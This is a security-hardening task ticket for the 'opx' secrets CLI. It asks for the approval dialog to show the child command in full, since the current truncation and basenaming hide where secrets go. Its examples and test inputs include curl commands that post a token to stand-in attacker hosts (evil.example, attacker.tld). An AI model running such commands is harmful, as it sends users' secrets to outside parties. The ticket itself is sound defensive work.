---
title: Render the run-mode child command faithfully in the approval dialog
priority: high
size: 3
status: new
created: 2026-07-31
source_branch: bestdan/security-scan-fixes
parent: sec_hardening
related_files:
  - internal/caller/caller.go:154 # RenderCommand
  - internal/caller/caller.go:161 # renderArgv — shared by ancestor + child rendering
  - internal/caller/caller.go:135 # describeArgv — the ancestor caller, must keep old behaviour
  - internal/caller/caller.go:174 # truncate
  - main.go:421 # CallerDetail: "to run: " + caller.RenderCommand(argv)
  - internal/caller/caller_test.go
tags: [security, caller, run-mode]
---

Part of [[sec_hardening_plan]]. Closes **F7, F9, F10**.

## Context

In `opx run`, the dialog line built at `main.go:421` is the **only** place the user learns which process is about to receive the plaintext secrets. It is built from `caller.RenderCommand(argv)`, which does two lossy things:

```go
func renderArgv(argv []string) string {
    for i, a := range argv {
        if i == 0 || strings.Contains(a, "/") {
            parts[i] = basename(a)     // caller.go:164-165
        }
    ...
}
func RenderCommand(argv []string) string {
    return truncate(renderArgv(argv), 120)   // caller.go:155
}
```

So:

- `/tmp/.cache/pytest` displays as `pytest`
- `https://attacker.tld/collect` displays as `collect`
- `sh -c 'curl -sd "$TOKEN" https://evil.example/x'` displays as `sh -c x` — the entire payload reduced to what follows its last slash
- anything past 120 runes disappears behind a single `…`

Every one of those hides exactly the part that identifies where the secret goes. The user approves `to run: curl -d @- collect` and gets an exfiltration POST.

The key insight for the fix: **`renderArgv` is shared by two callers with opposite requirements.** `describeArgv` (`caller.go:135`) uses it to describe an *ancestor* — context, where abbreviation is a readability win and the process has already run. `RenderCommand` uses it to describe a *child about to receive secrets* — an authorization decision, where abbreviation is a lie. They must stop sharing an implementation.

The `prompt.Request` doc comment already recognises this asymmetry (`prompt.go:50-55`): a `"to run: "` detail is never suppressed as duplicative, because it names a different process. This task extends the same reasoning to the rendering.

Note the interaction with [[sec_hardening_task_4]]: on macOS, ancestor argv comes from `ps -o args=` split on `strings.Fields`, so arguments containing spaces are already mangled at the source. That does **not** affect this task — `opx run`'s child argv comes straight from opx's own `os.Args`, unmangled, so faithful rendering is actually achievable here.

## Task

1. Split the rendering:
   - Keep `renderArgv` as-is, rename it to `renderAncestorArgv`, and leave `describeArgv` pointing at it. Ancestor display behaviour must not change — existing tests should keep passing untouched.
   - Add `renderChildCommand(argv []string) string`: **no basenaming of anything**. Full `argv[0]`, full argument values. Quote any argument containing whitespace, quotes, or control characters so the boundaries are unambiguous — `internal/shellquote` already exists for `--env` output and is the natural tool; reuse it rather than writing a second quoter.
   - Route control characters through the same escaping [[sec_hardening_task_1]] establishes, so a crafted argv cannot repaint the dialog from this direction either.
2. `RenderCommand` calls `renderChildCommand` and changes its truncation contract: when the rendered command exceeds the limit, do not end in a bare `…`. Emit the first N arguments in full plus an explicit count of what was dropped — `python3 deploy.py --region us-east-1 … +3 more arguments`. An approver who sees "+3 more arguments" knows they are not seeing everything; a trailing `…` reads as cosmetic.
3. Prefer never truncating `argv[0]` — the binary path is the single most decision-relevant token. If the path alone exceeds the limit, show it whole and truncate the arguments to nothing.
4. Consider raising the limit for the child line specifically (the ancestor line's 120 is fine). macOS `display dialog` scrolls a long body and the TTY path wraps, so a limit around 300 costs little. Do not remove the limit entirely — an unbounded body is its own denial-of-review.
5. Update `RenderCommand`'s doc comment to state the contract: this rendering is authorization-relevant and must not omit any part of the destination.

## Acceptance Criteria

**Code-enforced**

- `internal/caller/export_test.go` exposes `renderChildCommand` as `RenderChildCommandForTest`.
- `internal/caller/caller_test.go` asserts, for `RenderCommand`:
  - `[]string{"/tmp/.cache/pytest"}` renders containing the full `/tmp/.cache/` prefix.
  - `[]string{"curl", "-d", "@-", "https://attacker.tld/collect"}` renders containing `attacker.tld`.
  - `[]string{"sh", "-c", "curl -sd \"$T\" https://evil.example/x"}` renders containing `evil.example` with the `-c` payload quoted as one argument.
  - An argv exceeding the limit renders with an explicit `+N more` suffix and **not** a bare trailing `…`, and the `+N` matches the number of dropped arguments.
  - An argv whose `argv[0]` alone exceeds the limit still renders `argv[0]` in full.
  - An argv containing an ESC byte renders it escaped.
- Existing `RenderArgvForTest` / `DescribeArgvForTest` assertions still pass unmodified, proving ancestor rendering did not change.
- `run_subcommand_test.go` asserts the `CallerDetail` the fake Confirmer receives contains the full child path for a `/tmp/...` argv[0].
- `make test` and `make lint` pass.

**User-run**

- Run `opx run --env A=op://V/I/f -- /usr/bin/env FOO=1` and confirm the dialog shows `/usr/bin/env`, not `env`.
- Run the same with a long argv and confirm the dialog reads legibly and the `+N more` count is right.
